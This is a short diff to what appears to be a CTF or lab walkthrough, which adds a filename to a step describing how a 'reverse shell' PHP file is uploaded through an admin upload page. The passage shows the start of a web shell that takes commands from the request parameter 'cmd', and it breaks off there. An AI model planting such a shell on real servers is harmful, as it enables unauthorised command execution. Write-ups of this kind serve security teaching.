@@ -103,7 +103,7 @@ Let's browse to `admin.php` and log in to the website. If we log in successfully
 &nbsp;
 ![dashboard page](dashboard-1.jpg)
 &nbsp;
-Now we can browse to `upload.php` to upload the file. Let's try to upload our *reverse shell* to the server. My *reverse shell* script looks fairly simple like this:
+Now we can browse to `upload.php` to upload the file. Let's try to upload our *reverse shell* to the server. My *reverse shell* script is named `reverse-shell.php` and looks fairly simple like this:
 ```php
 <?php
         $cmd = $_REQUEST["cmd"];
